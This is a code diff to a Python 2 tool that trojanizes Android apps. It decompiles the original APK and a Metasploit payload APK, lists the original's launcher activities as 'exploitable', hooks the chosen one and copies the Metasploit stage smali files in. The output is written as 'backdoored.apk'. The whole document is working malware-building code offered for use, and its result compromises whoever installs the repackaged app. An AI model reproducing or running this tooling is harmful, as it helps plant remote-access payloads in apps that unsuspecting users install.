@@ -142,15 +142,16 @@ def check_requirements():
         print "Please specify the path to the original apk with the -o parameter"
         sys.exit(1)
 
-def place_hooks():
+def place_hooks(launcher_activity):
     global args
-    # hook in Main activity
-    # read the manifest to xml model
-    #print "Reading android manifest"
-    launcher_activity = manifest_analyzer.find_launcher_activity('original/_decompiled/AndroidManifest.xml')
-    print "[*] Launcheractivity: {} ".format(launcher_activity[0])
+    """ 
+        Places a hook in the main activity, and reads the 
+        manifest information to a XML model.
+        :param launcher_activity: The user-selecter launcher activity, (only one object)
+    """
+    print "[*] Launcheractivity: {} ".format(launcher_activity)
 
-    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))
+    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity.replace(".", "/"))
 
 
     hookedsmali = main_hook.generate_hooked_smali(smali_file)
@@ -198,13 +199,32 @@ def main():
     print "[*] Decompiling payload APK..\n"
     builder.decompileApk("payload.apk")
 
-    # TODO make path dynamic
+
+    print "Exploitable activities: "
+    exploitable_activities = manifest_analyzer.find_launcher_activities('original/_decompiled/AndroidManifest.xml')
+    for i in range(len(exploitable_activities)):
+        print("[{}.] {}".format(i, exploitable_activities[i]))
+    print 
+    index = int(input("Which activity should be hooked?"))
+    launcher_activity = exploitable_activities[index]
+    print("Successfully selected {} entry point.".format(exploitable_activities[index]))
+
+    # read the manifest to xml model
+    print "Reading android manifest"
+
+    print "[*] Launcheractivity: {} ".format(launcher_activity)
+
+    smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity.replace(".", "/"))
+
+    print smali_file
+    time.sleep(10)
+
     print "[*] Copying payload files..\n"
     mkdir_p('original/_decompiled/smali/com/metasploit/stage')
     os.system('cp payload/_decompiled/smali/com/metasploit/stage/*.smali '
               'original/_decompiled/smali/com/metasploit/stage/')
 
-    place_hooks()
+    place_hooks(launcher_activity)
 
     #exit(1)
     injected_apk = "backdoored.apk"
